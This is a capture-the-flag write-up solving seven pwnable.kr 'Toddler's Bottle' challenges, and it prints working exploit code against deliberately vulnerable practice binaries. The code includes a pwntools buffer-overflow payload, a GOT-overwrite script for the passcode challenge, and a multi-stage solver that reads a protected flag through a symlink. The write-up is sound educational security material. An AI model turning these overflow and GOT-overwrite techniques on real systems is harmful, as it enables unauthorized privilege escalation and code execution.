## Toddler's Bottle Challenges

### [fd]

After ssh-ing into the box, we can run `ls` to see that there are three files present, a 32-bit Linux ELF executable, the source code for the executable, and a flag file.  Attempting to `cat` the flag yields a privilege error because we are a guest user.  Consequently, we need to use the executable to read the flag.  Examining the source code shows a call to `system("/bin/cat flag");` if the input buffer, read from a calculated file descriptor, is equivalent to `"LETMEWIN\n"`.  

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
~~~

The trick for this is to understand that the Linux file descriptor for standard input is 0.  Since `fd` is calculated by taking the input argument minus `0x1234`, we need to use an input argument of 4660 (the equivalent value in decimal).  This allows us to pass standard input into the binary to be processed.  We can create a file with the required text, or use `echo` (which will automatically append a new line `\n` character to the end of the text).  Using `echo "LETMEWIN" | ./fd 4660` yields the flag.


### collision

We are presented with a similar situation to the previous challenge, and need to use the `col` binary to read the flag.  In this case, we need to present an input of 20 bytes which will be processed and compared to `0x21DD09EC`.  The "processing" includes casting the input from a character string to an integer array.  Since an integer is four bytes, the input will parsed into five groups.  It is important to run `file` on the binary to determine endianess - in this case, the result is `ELF 32-bit LSB executable`, indicating little-endian (Least Signficant Byte).  This means that the bytes in each group will be reversed when processed as integers.  The integers are then summed into a `res` variable which is returned and compared to `0x21DD09EC`.  

~~~c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
~~~

We can calculate `0x21DD09EC/5` to determine which integers to send.  The result is `113626824.8`, which means we can send `113626825` four times and `113626824` once to return `0x21DD09EC`.  Converting these values to hex yields `0x6C5CEC9` and `0x6C5CEC8`, respectively.  Again, we need to arrange in little endian format to correctly process the integers.  It is easiest to use `echo -e -n` and pipe the result to the executable given the bytes are not ASCII characters (here the `-n` flag suppresses a new line character, which is necessary otherwise we would input 21 bytes, not 20).  Running `./col $(echo -n -e "\xc8\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6")` yields the flag.

### bof
For this challenge we are provided links to download a bof executable and the corresponding C source code.  Doing a quick check with `file`, `bof` is again a 32-bit little-endian ELF executable.  A quick scan of the source code shows a `gets` vulnerability in the `puts()` function. Opening the binary in gdb and diassembling `func()` provides the binary's assembly code: 

~~~gdb
gdb-peda$ disass func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e38420 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e37940 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e0d000 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e38420 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7edba20 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret  
~~~

This again shows there is no bound checking on the input; the binary will store the input buffer at `[esp]` which is equal to `[ebp - 0x2c]`.  Note also that a stack canary is used but not checked before running the system call.  Access to the system call requires passing the check: `cmp    DWORD PTR [ebp+0x8],0xcafebabe`.  Thus, a simple buffer overflow storing `0xcafebabe` at `ebp+0x8` is sufficient to get a shell (for full code, see `bof_solver.py`):

~~~python
def main(arguments):
    check = 0xcafebabe
    p = binary_connect(arguments)
    p.send(b'A'* 0x2c + b'B' * 8 + p32(check) + b'\n')
    p.interactive()
~~~

### flag
This challenge is a simple reversing challenge that presents a standalone binary to examine. Downloading and running the `flag` binary prints out the following prompt: `I will malloc() and strcpy the flag there. take it.`  Seems simple enough, but attempting to disassemble the binary with `objdump` yields the following: 

~~~bash
$ objdump -d flag

flag:     file format elf64-x86-64
~~~

That's interesting.  Opening in a diassembler like Binary Ninja also shows a number of function calls, but no `main` entry point.  While the file is correctly identified as an ELF executable, something is still wrong.  Taking a look at the file's hex output shows the following: 
![flag_hex](https://raw.githubusercontent.com/comed-ian/CTF-Writeups/main/pwnable.kr/toddlers_bottle/_images/flag.png)

Note the `UPX!` bytes, which indicate that this file is compressed using the [upx packer](https://upx.github.io/).  Installing and running upx on the file generates a much more familiar output: 

~~~bash
$ upx -d flag -o flag1
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag1

Unpacked 1 file.
$ objdump -d -M intel flag1 | grep "<main>:" -A 15
0000000000401164 <main>:
  401164:       55                      push   rbp
  401165:       48 89 e5                mov    rbp,rsp
  401168:       48 83 ec 10             sub    rsp,0x10
  40116c:       bf 58 66 49 00          mov    edi,0x496658
  401171:       e8 0a 0f 00 00          call   402080 <_IO_puts>
  401176:       bf 64 00 00 00          mov    edi,0x64
  40117b:       e8 50 88 00 00          call   4099d0 <__libc_malloc>
  401180:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  401184:       48 8b 15 e5 0e 2c 00    mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 6c2070 <flag>
  40118b:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  40118f:       48 89 d6                mov    rsi,rdx
  401192:       48 89 c7                mov    rdi,rax
  401195:       e8 86 f1 ff ff          call   400320 <.plt+0x10>
  40119a:       b8 00 00 00 00          mov    eax,0x0
  40119f:       c9                      leave
~~~

Here we see that the flag is loaded into rdx and is stored at address 0x6c2070.  Opening the binary in Binary Ninja shows that the pointer at this location points to the string at address 0x496628, which can be viewed to find the flag stored in plaintext.  

### passcode
This binary appears to have some `scanf` vulnerabilities, hinted at by the comments in the source code.  Running `clang passcode.c -o passcode` illuminates this hint with `clang`'s warning flags: 

~~~bash
passcode.c:9:14: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
        scanf("%d", passcode1);
               ~~   ^~~~~~~~~
passcode.c:14:21: warning: format specifies type 'int *' but the argument has type 'int' [-Wformat]
        scanf("%d", passcode2);
~~~

The key to this vulnerability is that the `passcode` values are stored as integers on the stack within the `login` function. `scanf` will attempt to store user input at the memory address pointed to by the stack values.  Running the program in gdb shows that `passcode1` attemps to store the value at an address in glibc, which does not have write privileges: 

~~~gdb 
[-------------------------------------code-------------------------------------]
   0x804857c <login+24>:        mov    edx,DWORD PTR [ebp-0x10]
   0x804857f <login+27>:        mov    DWORD PTR [esp+0x4],edx
   0x8048583 <login+31>:        mov    DWORD PTR [esp],eax
=> 0x8048586 <login+34>:        call   0x80484a0 <__isoc99_scanf@plt>
   0x804858b <login+39>:        mov    eax,ds:0x804a02c
[------------------------------------stack-------------------------------------]
0000| 0xfff2b6f0 --> 0x8048783 --> 0x65006425 ('%d')
0004| 0xfff2b6f4 --> 0xf7631cab (<puts+11>:     add    ebx,0x152355)
~~~

This will cause a segmentation fault when executed.  However, some simple testing shows that the username queried prior to `login` can be used to alter some stack values, which are later retrieved during the `login` function.  The `welcome` function accepts a full 100 characters using `scanf` and stores the input in a 100 character stack buffer.  This has an off-by-one error, as `scanf` accepts the full 100 characters and then adds a trailing null byte.  This is perfect for our uses, since the final four bytes of username input coincide with the stack address where `passcode1` is eventually stored.  This gives us control to change the pointer where the `passcode1` input will be stored with the username input.  We want to control execution flow to call the instructions after the credential checks in `login`, and a great target to hijack execution is using the GOT address for `fflush`, since it is called immediately after `passcode1` is retrieved.  We can retrieve the GOT address using pwntools and send it in as the last four bytes of our username.  Then, we overwrite this GOT address with the address of the validated login instructions.  Note that this address should be passed in as a string of integers, since `scanf` expects a string input of decimal numbers.  The following short script accomplishes this goal and gains elevated privileges to cat the flag.

~~~python
from pwn import *

def exploit():
        p = process('/home/passcode/passcode')
        e = ELF('/home/passcode/passcode')
        fflush_got_addr = e.got['fflush']
        login_addr = 0x80485d7
        print (hex(fflush_got_addr), login_addr)
        p.send(b"A" * 96 + p32(fflush_got_addr) + str(login_addr))
        print(p.recv)

        p.interactive()

if __name__ == "__main__":
        context.log_level = 'debug'
        exploit()
~~~

### random 
This challenge includes a binary that attempts to implement the C library's `random` function. However, the key flaw is that the `random()` call is not first seeded, meaning that the random value generated will be the same each run.  Opening in gdb and setting a breakpoint after the call shows that the value is always equal to 0x6b8b4567.  Since the xor operation is reversible, simply calculating `0x6b8b4567 ^ 0xdeadbeef` yields the valid input `3039230856`.  Passing this value into the binary successfully elevates privileges and cats the flag.  

### input 
This challenge is less about pwning / reversing and more about interacting with binaries.  The binary requires that we interact with it in five specific ways:
* First, we need to open the process with 100 arguments (including the argument for the executable itself).  This is most easily done by creating a list and using pwntool's `process` module to open the binary with the listed arguments.  Furthermore, we need to make sure that the 'A'th (aka 41st) and 'B'th (aka 42nd) argument in the list adhere to the binary's requirement of `\x00` and `\x20\x0a\x0d`.  
* Second, we need to send the binary data, which is receives on two different file descriptors.  The first is the `stdin` descriptor, which is the default used by pwntools's `process.send()` function.  The second is `fd=2`, which is `stderr`.  We can load this file descriptor by first creating a pipe using `os.pipe()` and mapping the input of the pipe to `stderr=` in the process's creation.  This will allow us to use `os.write(fd, data)` to write to the `stderr` file descriptor.  
* Third, we need to set environment variables to specific values. This is easy using Python's `os.environ()` function.  
* Fourth, the binary opens a file `\x0a` and compares its data to a predetermined string.  To create a file we need to be in the `/tmp` directory, since the `/home` directories do not have write privileges.  Simply opening, writing to, and closing the file is sufficient to pass this check
* Finally, the binary takes the 'C'th (aka 43rd) argument and uses that as a port to listen on for communication.  We can choose a random high number port value (to avoid conflicts) and create a socket using Python `socket` library.  Connecting to `localhost` and sending the required data passes the test

This is all sufficient to pass the five requirements, however we are at an impasse; the binary tries to cat `./flag`, however the flag file does not reside in `/tmp`. We cannot `cp` the flag file because we do not have read permissions in `/home/`, nor can we run the script from `/home` because we cannot create the required `\x0a` file in the `/home` directory.  The solution is to create a symlink between a local `flag` file and the actual flag file in `/home/input2`.  The command `ln -sf /home/input2/flag flag` accomplishes this goal and achieves escalated privileges. 

~~~python
from pwn import *
import sys
import socket

port = 19564
r, w = os.pipe()
def stage1():
        argv1 = ['/home/input2/input']
        for i in range(0,99):
                if (i == ord('A') - 1):
                        argv1.append('\x00')
                elif (i == ord('B') - 1):
                        argv1.append("\x20\x0a\x0d")
                elif (i == ord('C') - 1):
                        argv1.append(str(port)) # set up port for Stage 5
                else:
                        argv1.append(str(i))
        p = process(argv=argv1,stderr=r) # set up stderr for Stage 2
        os.close(r)
        return p

def stage2(p):
        p.send("\x00\x0a\x00\xff")
        os.write(w,b"\x00\x0a\x02\xff")

def stage3():
        os.environ["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"
        assert(os.getenv("\xde\xad\xbe\xef") == "\xca\xfe\xba\xbe")

def stage4():
        f = open("\x0a", 'w')
        f.write('\x00\x00\x00\x00')
        f.close()

def stage5():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', port))
        s.send("\xde\xad\xbe\xef")
        s.close()

def exploit():
        # set environment variables and file first, otherwise the binray will race (and beat) script
        stage3()
        stage4()
        p = stage1() # open process with correct argv values
        stage2(p) # send correct values via stdout and stderr
        stage5()
        p.interactive()


if __name__ == "__main__":
        exploit()
~~~
